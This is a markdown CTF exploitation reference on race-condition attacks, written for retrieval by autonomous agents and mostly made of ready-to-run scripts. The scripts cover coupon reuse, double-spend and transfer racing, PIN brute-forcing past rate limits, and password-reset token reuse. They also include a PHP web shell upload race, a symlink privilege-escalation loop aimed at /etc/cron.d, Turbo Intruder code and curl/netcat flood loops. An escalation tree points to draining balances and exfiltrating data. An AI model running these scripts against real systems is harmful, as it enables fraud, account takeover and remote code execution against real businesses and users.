# Race Conditions - CTF Exploitation Reference

> **Document Purpose:** Actionable race condition attack techniques for CTF challenges. Designed for autonomous agent retrieval with exploitation scripts, timing techniques, and common vulnerable patterns.

---

## 1. QUICK REFERENCE: Race Condition Basics

> **When to use this section:** You suspect time-of-check to time-of-use vulnerabilities.

### 1.1 What is a Race Condition?

**Tags:** `race-condition, toctou, concurrency, timing`

**Concept:**
A race condition occurs when multiple operations on shared resources aren't properly synchronized, allowing exploitation in the timing gap.

**TOCTOU (Time-of-Check to Time-of-Use):**
```
1. CHECK: Application verifies condition (e.g., sufficient balance)
2. GAP:   Window where attacker can act
3. USE:   Application performs action (e.g., deducts balance)

Attack: Send multiple requests during the GAP
```

**Common Vulnerable Patterns:**
| Pattern | Example | Exploit |
|---------|---------|---------|
| Balance check then deduct | Purchase items | Double-spend |
| Coupon validation then apply | Discount codes | Multiple use |
| File existence check then create | File upload | Overwrite |
| Token validation then invalidate | Password reset | Token reuse |
| Limit check then increment | API rate limiting | Bypass limits |

**Agent Takeaway:**
- Look for check-then-act patterns
- Send many concurrent requests
- Target: balance, coupons, limits, tokens

---

### 1.2 Identifying Race Condition Opportunities

**Tags:** `race-condition, identification, recon, patterns`

**High-Value Targets:**
```
- E-commerce: checkout, coupons, discounts
- Banking: transfers, withdrawals
- Voting systems: vote submission
- File operations: upload, delete, rename
- Account features: email change, password reset
- API: rate limits, quotas
```

**Code Patterns to Look For:**
```python
# Vulnerable pattern
balance = get_balance(user_id)
if balance >= amount:
    # GAP: Race condition window
    deduct_balance(user_id, amount)
    give_item(user_id, item)
```

**Detection via Response Analysis:**
```
- Inconsistent responses for same request
- Balance changes unpredictably
- Duplicate items or credits
- Error messages about concurrent access
```

**Agent Takeaway:**
- Focus on financial/resource operations
- Look for non-atomic operations
- Test by sending parallel requests

---

## 2. RACE CONDITION: Limit Bypass

> **When to use this section:** Bypassing one-time use restrictions (coupons, tokens).

### 2.1 Single-Use Bypass Attack

**Tags:** `race-condition, limit-bypass, coupon, single-use`

**The Vulnerability:**
```
1. Application checks if coupon is used
2. Application applies discount
3. Application marks coupon as used

Race: Apply coupon multiple times before step 3
```

**Python Exploit Script:**
```python
import asyncio
import aiohttp

async def apply_coupon(session, url, coupon_code, cookies):
    """Send single coupon application request."""
    data = {"coupon": coupon_code}
    async with session.post(url, data=data, cookies=cookies) as response:
        return await response.text()

async def race_attack(url, coupon_code, cookies, num_requests=50):
    """Send many concurrent requests to exploit race condition."""
    async with aiohttp.ClientSession() as session:
        # Create all tasks
        tasks = [
            apply_coupon(session, url, coupon_code, cookies)
            for _ in range(num_requests)
        ]
        # Execute all at once
        results = await asyncio.gather(*tasks)
        return results

# Usage
asyncio.run(race_attack(
    "http://target.com/apply-coupon",
    "DISCOUNT50",
    {"session": "your_session_cookie"},
    50
))
```

**Curl with GNU Parallel:**
```bash
# Send 100 concurrent requests
seq 1 100 | parallel -j 100 \
    "curl -s -X POST http://target.com/apply-coupon \
    -d 'coupon=DISCOUNT50' \
    -H 'Cookie: session=YOUR_SESSION'"
```

**Agent Takeaway:**
- Target one-time use features
- Send 50-100+ concurrent requests
- Check if discount applied multiple times

---

### 2.2 Rate Limit Bypass

**Tags:** `race-condition, rate-limit, bypass, brute-force`

**The Vulnerability:**
```
1. Application checks request count
2. Application processes request
3. Application increments counter

Race: Send many requests before counter updates
```

**Attack Script:**
```python
import asyncio
import aiohttp

async def brute_force_pin(session, url, pin, cookies):
    """Attempt single PIN guess."""
    data = {"pin": pin}
    async with session.post(url, data=data, cookies=cookies) as response:
        text = await response.text()
        if "success" in text.lower() or "correct" in text.lower():
            print(f"[+] Found PIN: {pin}")
        return pin, text

async def race_brute_force(url, cookies, pin_range=(0, 10000)):
    """Bypass rate limit by sending concurrent PIN attempts."""
    async with aiohttp.ClientSession() as session:
        batch_size = 100  # Send 100 at a time

        for batch_start in range(pin_range[0], pin_range[1], batch_size):
            batch_end = min(batch_start + batch_size, pin_range[1])
            pins = [f"{i:04d}" for i in range(batch_start, batch_end)]

            tasks = [
                brute_force_pin(session, url, pin, cookies)
                for pin in pins
            ]
            await asyncio.gather(*tasks)
            print(f"[*] Tested {batch_start}-{batch_end}")

# Usage
asyncio.run(race_brute_force(
    "http://target.com/verify-pin",
    {"session": "your_session"}
))
```

**Agent Takeaway:**
- Rate limits often have race conditions
- Send batches of concurrent requests
- Can bypass per-second/per-minute limits

---

## 3. RACE CONDITION: Double Spend

> **When to use this section:** Exploiting financial/balance operations.

### 3.1 Classic Double Spend Attack

**Tags:** `race-condition, double-spend, balance, money`

**The Vulnerability:**
```python
# Vulnerable code
balance = get_balance(user)  # Check
if balance >= 100:
    deduct_balance(user, 100)  # Use
    give_item(user, "expensive_item")

# Attack: Send 10 purchase requests simultaneously
# Result: Get 10 items while only paying for 1
```

**Python Exploit:**
```python
import asyncio
import aiohttp

async def purchase_item(session, url, item_id, cookies):
    """Send purchase request."""
    data = {"item_id": item_id}
    async with session.post(url, data=data, cookies=cookies) as response:
        return await response.text()

async def double_spend_attack(url, item_id, cookies, num_requests=20):
    """Exploit race condition for double spending."""
    async with aiohttp.ClientSession() as session:
        # Send all purchase requests at once
        tasks = [
            purchase_item(session, url, item_id, cookies)
            for _ in range(num_requests)
        ]
        results = await asyncio.gather(*tasks)

        # Count successes
        successes = sum(1 for r in results if "success" in r.lower())
        print(f"[+] Successful purchases: {successes}")
        return results

# Usage
asyncio.run(double_spend_attack(
    "http://target.com/purchase",
    "expensive_item_123",
    {"session": "your_session"},
    20
))
```

**Testing with Burp Suite:**
```
1. Capture purchase request
2. Send to Intruder
3. Set "Null payloads" with 50+ requests
4. Set "Concurrent requests" to maximum (10-20)
5. Start attack
6. Check how many succeeded
```

**Agent Takeaway:**
- Target purchase/transfer/withdraw endpoints
- Send 20-50 concurrent requests
- Check actual balance after attack

---

### 3.2 Transfer Race Condition

**Tags:** `race-condition, transfer, money, balance`

**Attack Scenario:**
```
Account A: $100
Account B: $0

Attack: Send 5 concurrent transfers of $100 from A to B

Vulnerable Result: B receives $500 while A shows -$400 or $0
```

**Exploit Script:**
```python
import asyncio
import aiohttp

async def transfer_money(session, url, from_acc, to_acc, amount, cookies):
    """Send transfer request."""
    data = {
        "from": from_acc,
        "to": to_acc,
        "amount": amount
    }
    async with session.post(url, data=data, cookies=cookies) as response:
        return await response.text()

async def transfer_race_attack(url, from_acc, to_acc, amount, cookies, num=10):
    """Race condition on transfer."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            transfer_money(session, url, from_acc, to_acc, amount, cookies)
            for _ in range(num)
        ]
        results = await asyncio.gather(*tasks)
        return results

# Usage
asyncio.run(transfer_race_attack(
    "http://target.com/transfer",
    "account_a",
    "account_b",
    100,  # Transfer $100
    {"session": "your_session"},
    10  # Send 10 concurrent transfers
))
```

**Agent Takeaway:**
- Each transfer should check balance atomically
- Multiple concurrent transfers may all succeed
- Check final balances after attack

---

## 4. RACE CONDITION: Token Reuse

> **When to use this section:** Exploiting password reset or verification tokens.

### 4.1 Password Reset Token Reuse

**Tags:** `race-condition, password-reset, token, reuse`

**The Vulnerability:**
```
1. User requests password reset
2. Token generated and sent
3. User clicks link, enters new password
4. Token marked as used

Race: Use same token multiple times before step 4
```

**Attack Scenario:**
```
1. Request password reset for victim
2. Somehow obtain reset token (email access, prediction, etc.)
3. Send concurrent password change requests
4. All may succeed due to race condition
```

**Exploit Script:**
```python
import asyncio
import aiohttp

async def reset_password(session, url, token, new_password):
    """Send password reset request."""
    data = {
        "token": token,
        "password": new_password,
        "confirm_password": new_password
    }
    async with session.post(url, data=data) as response:
        return await response.text()

async def token_reuse_attack(url, token, passwords):
    """Try to use same token for multiple password resets."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            reset_password(session, url, token, pwd)
            for pwd in passwords
        ]
        results = await asyncio.gather(*tasks)
        return results

# Usage - try setting different passwords with same token
asyncio.run(token_reuse_attack(
    "http://target.com/reset-password",
    "RESET_TOKEN_HERE",
    ["password1", "password2", "password3", "password4", "password5"]
))
```

**Agent Takeaway:**
- Single-use tokens may have race conditions
- Send concurrent requests with same token
- Works on password reset, email verification, etc.

---

### 4.2 Session Token Race

**Tags:** `race-condition, session, token, concurrent`

**Exploiting Session Creation:**
```python
import asyncio
import aiohttp

async def login(session, url, username, password):
    """Perform login."""
    data = {"username": username, "password": password}
    async with session.post(url, data=data) as response:
        # Get session cookie
        cookies = response.cookies
        return dict(cookies)

async def concurrent_logins(url, username, password, num=10):
    """Create multiple sessions concurrently."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            login(session, url, username, password)
            for _ in range(num)
        ]
        sessions = await asyncio.gather(*tasks)

        # Check for duplicate sessions or anomalies
        unique_sessions = set(str(s) for s in sessions)
        print(f"[+] Created {len(sessions)} logins, {len(unique_sessions)} unique")
        return sessions
```

**Agent Takeaway:**
- Session creation may have race conditions
- May create duplicate or conflicting sessions
- Useful for bypassing session limits

---

## 5. RACE CONDITION: File Operations

> **When to use this section:** Exploiting file upload/processing race conditions.

### 5.1 File Upload Race

**Tags:** `race-condition, file-upload, overwrite, timing`

**The Vulnerability:**
```
1. Application receives uploaded file
2. Application validates file type
3. Application moves to final location
4. Application checks for malicious content

Race: Access file between steps 3 and 4
```

**Exploit Approach:**
```python
import asyncio
import aiohttp

async def upload_shell(session, upload_url, filename="shell.php"):
    """Upload PHP shell."""
    data = aiohttp.FormData()
    data.add_field('file',
                   '<?php system($_GET["cmd"]); ?>',
                   filename=filename,
                   content_type='application/x-php')
    async with session.post(upload_url, data=data) as response:
        return await response.text()

async def access_shell(session, shell_url, cmd="id"):
    """Try to access uploaded shell."""
    try:
        async with session.get(f"{shell_url}?cmd={cmd}", timeout=0.5) as response:
            text = await response.text()
            if "uid=" in text:  # Command executed
                print(f"[+] Shell executed: {text[:100]}")
            return text
    except:
        return None

async def file_race_attack(upload_url, shell_url, cookies, iterations=100):
    """Race between upload and access."""
    async with aiohttp.ClientSession(cookies=cookies) as session:
        for i in range(iterations):
            # Start upload and access concurrently
            upload_task = upload_shell(session, upload_url)
            access_tasks = [
                access_shell(session, shell_url)
                for _ in range(10)
            ]

            await asyncio.gather(upload_task, *access_tasks)
            print(f"[*] Iteration {i+1}/{iterations}")
```

**Agent Takeaway:**
- Upload and access file simultaneously
- May execute before validation/deletion
- Useful for bypassing file type restrictions

---

### 5.2 Symlink Race Condition

**Tags:** `race-condition, symlink, file, toctou`

**The Vulnerability:**
```
1. Application checks if file exists
2. Application creates/writes file
3. Attacker replaces file with symlink between 1 and 2
4. Application writes to symlink target
```

**Concept (Local Privilege Escalation):**
```bash
# Target: setuid binary that writes to /tmp/output

# Attack loop
while true; do
    rm -f /tmp/output
    ln -s /etc/cron.d/malicious /tmp/output
done &

# Trigger the vulnerable operation
./vulnerable_binary
```

**Agent Takeaway:**
- Classic local privilege escalation technique
- Replace regular file with symlink in timing window
- Less common in web CTFs but appears in pwn/misc

---

## 6. EXPLOITATION TOOLS AND TECHNIQUES

> **When to use this section:** Setting up race condition attacks.

### 6.1 Turbo Intruder (Burp Extension)

**Tags:** `race-condition, turbo-intruder, burp, parallel`

**Setup:**
```
1. Install "Turbo Intruder" from BApp Store
2. Capture target request in Burp
3. Right-click -> Send to Turbo Intruder
```

**Race Condition Script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=False
    )

    # Queue many identical requests
    for i in range(100):
        engine.queue(target.req, gate='race1')

    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Log all responses
    table.add(req)
```

**Last-Byte Sync (Precise Timing):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=1,
        pipeline=False
    )

    for i in range(30):
        # Hold back last byte for synchronization
        engine.queue(target.req, gate='race1', pauseMarker=['\r\n\r\n'])

    # Release all last bytes simultaneously
    engine.openGate('race1')
```

**Agent Takeaway:**
- Turbo Intruder is best for precise timing
- Use gate feature for synchronized release
- Last-byte sync for maximum precision

---

### 6.2 Command Line Racing

**Tags:** `race-condition, curl, parallel, bash`

**GNU Parallel:**
```bash
# 100 concurrent requests
seq 1 100 | parallel -j 100 \
    "curl -s -X POST http://target.com/purchase \
    -d 'item_id=1' \
    -H 'Cookie: session=YOUR_SESSION' \
    -o /dev/null -w '%{http_code}\n'"
```

**Background Jobs:**
```bash
# Fire 50 requests in background
for i in {1..50}; do
    curl -s -X POST http://target.com/purchase \
        -d 'item_id=1' \
        -H 'Cookie: session=YOUR_SESSION' &
done
wait
```

**Using Netcat:**
```bash
# Prepare request
cat > request.txt << 'EOF'
POST /purchase HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR_SESSION
Content-Length: 8

item_id=1
EOF

# Send many times
for i in {1..100}; do
    cat request.txt | nc target.com 80 &
done
```

**Agent Takeaway:**
- GNU parallel is simple and effective
- Background jobs (&) for concurrent execution
- Netcat for raw HTTP control

---

### 6.3 Python AsyncIO Template

**Tags:** `race-condition, python, asyncio, template`

**Complete Race Attack Template:**
```python
#!/usr/bin/env python3
"""Race condition attack template."""

import asyncio
import aiohttp
import sys

class RaceAttack:
    def __init__(self, target_url, cookies=None, num_requests=50):
        self.target_url = target_url
        self.cookies = cookies or {}
        self.num_requests = num_requests
        self.results = []

    async def single_request(self, session, data=None):
        """Send a single request."""
        try:
            async with session.post(
                self.target_url,
                data=data,
                cookies=self.cookies
            ) as response:
                text = await response.text()
                status = response.status
                self.results.append((status, text[:200]))
                return status, text
        except Exception as e:
            return None, str(e)

    async def run_attack(self, data=None):
        """Execute race condition attack."""
        connector = aiohttp.TCPConnector(limit=100)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Create all tasks
            tasks = [
                self.single_request(session, data)
                for _ in range(self.num_requests)
            ]
            # Execute all at once
            await asyncio.gather(*tasks)

        return self.analyze_results()

    def analyze_results(self):
        """Analyze attack results."""
        status_counts = {}
        for status, text in self.results:
            status_counts[status] = status_counts.get(status, 0) + 1

        print(f"\n[*] Attack Results:")
        print(f"    Total requests: {len(self.results)}")
        print(f"    Status codes: {status_counts}")

        # Count successes (customize based on response)
        successes = sum(1 for s, t in self.results
                       if "success" in t.lower() or s == 200)
        print(f"    Apparent successes: {successes}")

        return self.results

async def main():
    attack = RaceAttack(
        target_url="http://target.com/purchase",
        cookies={"session": "YOUR_SESSION"},
        num_requests=50
    )

    results = await attack.run_attack(
        data={"item_id": "1", "quantity": "1"}
    )

if __name__ == "__main__":
    asyncio.run(main())
```

**Agent Takeaway:**
- Reusable template for race attacks
- Adjust num_requests based on target
- Customize success detection logic

---

## 7. CTF-SPECIFIC STRATEGIES

> **When to use this section:** Solving race condition challenges in CTF.

### 7.1 Race Condition CTF Playbook

**Tags:** `race-condition, ctf, playbook, workflow`

**Step 1: Identify Potential Targets**
```
- Purchase/transfer operations
- Coupon/discount application
- Vote/like systems
- Rate-limited operations
- One-time use tokens
- File upload/processing
```

**Step 2: Understand the Operation**
```
1. Perform operation normally
2. Note all state changes (balance, inventory, etc.)
3. Identify what's being checked
4. Identify what's being modified
5. Find the gap between check and modify
```

**Step 3: Choose Attack Method**
```
- Python asyncio for flexibility
- Turbo Intruder for precision
- curl + parallel for quick tests
```

**Step 4: Execute and Verify**
```
- Send 50-100 concurrent requests
- Check state after attack
- Look for duplicated resources
- Verify with multiple attempts if first fails
```

**Agent Takeaway:**
- Identify check-then-act patterns
- Use appropriate tool for concurrency
- Verify success by checking final state

---

### 7.2 Race Condition Decision Tree

**Tags:** `race-condition, decision-tree, workflow`

```
START: Potential race condition identified

STEP 1: Identify operation type
├── Financial (balance, transfer)
├── Resource (items, credits)
├── Limit (coupon, token)
├── Rate limit bypass
└── File operation

STEP 2: Set up attack
├── Capture request in Burp/proxy
├── Prepare concurrent request script
├── Set request count (50-100)
└── Note expected state changes

STEP 3: Execute attack
├── Send all requests simultaneously
├── Use gate/synchronization if needed
└── Wait for all responses

STEP 4: Verify results
├── Check balance/inventory
├── Count successful responses
├── Look for error messages
└── Repeat if marginal success

STEP 5: Escalate if successful
├── Can you drain entire balance?
├── Can you get unlimited items?
├── Can you access admin functions?
└── Can you exfiltrate data?
```

---

## 8. SUMMARY: Race Condition Quick Reference

**Python Async Template:**
```python
import asyncio
import aiohttp

async def attack(url, data, num=50):
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, data=data)
            for _ in range(num)
        ]
        return await asyncio.gather(*tasks)

asyncio.run(attack("http://target.com/buy", {"item": 1}))
```

**Curl Parallel:**
```bash
seq 1 100 | parallel -j 100 "curl -s http://target.com/buy -d 'item=1'"
```

**Turbo Intruder:**
```python
for i in range(100):
    engine.queue(target.req, gate='race1')
engine.openGate('race1')
```

**Common Targets:**
```
- /purchase, /buy, /checkout
- /transfer, /send
- /apply-coupon, /redeem
- /vote, /like
- /reset-password
```

**Key Concepts:**
```
TOCTOU: Time-of-Check to Time-of-Use
Atomic: Operation that cannot be interrupted
Race Window: Gap between check and action
Concurrency: Number of simultaneous requests
```

**Testing Tips:**
```
1. Start with 50-100 concurrent requests
2. Increase if no success
3. Check state before AND after attack
4. Try multiple times (timing-dependent)
5. Use precise synchronization if needed
```
